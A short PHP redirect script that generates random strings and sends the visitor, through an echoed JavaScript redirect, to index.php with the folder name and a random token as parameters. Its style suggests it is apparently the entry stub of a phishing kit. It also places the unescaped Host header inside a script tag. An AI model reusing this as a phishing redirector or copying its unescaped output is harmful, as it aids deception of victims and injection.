<?php
function Rand_XD_TF($length) {
    $characters = 'abcdefjhigklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $charactersLength = strlen($characters);
    $randomString = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString;
}

$RandOP_M_1 = Rand_XD_TF(5);
$RandOP_M_2 = Rand_XD_TF(9);
$RandOP_M_3 = Rand_XD_TF(8);
$StrongSol = "" . basename(__DIR__);
$domine = "http://$_SERVER[HTTP_HOST]/index.php?lolme=$StrongSol&gid=$RandOP_M_1";
echo "<script LANGUAGE='JavaScript'>
        window.location.href='$domine';
      </script>";
?>